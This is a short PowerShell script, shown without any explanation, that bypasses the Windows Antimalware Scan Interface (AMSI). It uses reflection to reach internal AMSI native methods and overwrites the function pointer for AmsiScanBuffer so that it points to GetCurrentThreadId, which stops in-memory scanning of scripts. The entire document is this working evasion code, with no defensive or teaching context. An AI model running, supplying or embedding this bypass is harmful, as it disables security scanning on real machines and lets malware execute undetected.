$fn = [Reflection.BindingFlags]'NonPublic,Static'
$gtau = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'). `
GetNestedType('AmsiNativeMethods',[Reflection.BindingFlags]'NonPublic')
$gtpu = [Ref].Assembly.GetType('System.Management.Automation.PsUtils'). `
GetNestedType('NativeMethods',[Reflection.BindingFlags]'NonPublic')
Start-Sleep -Seconds 1
$mp    = $gtau.GetMethod('AmsiScanBuffer',$fn).MethodHandle
$ptr1 = $gtpu.GetMethod('GetCurrentThreadId',$fn).MethodHandle.GetFunctionPointer()
$out    = 1..50|?{[Runtime.InteropServices.Marshal]::ReadIntPtr($mp.Value,$_*8) -eq `
$mp.GetFunctionPointer()}|select -First 1
if ($null -eq $out) { throw 'Offset not found - patch did not apply' }
[Runtime.InteropServices.Marshal]::WriteIntPtr($mp.Value,$out*8,$ptr1)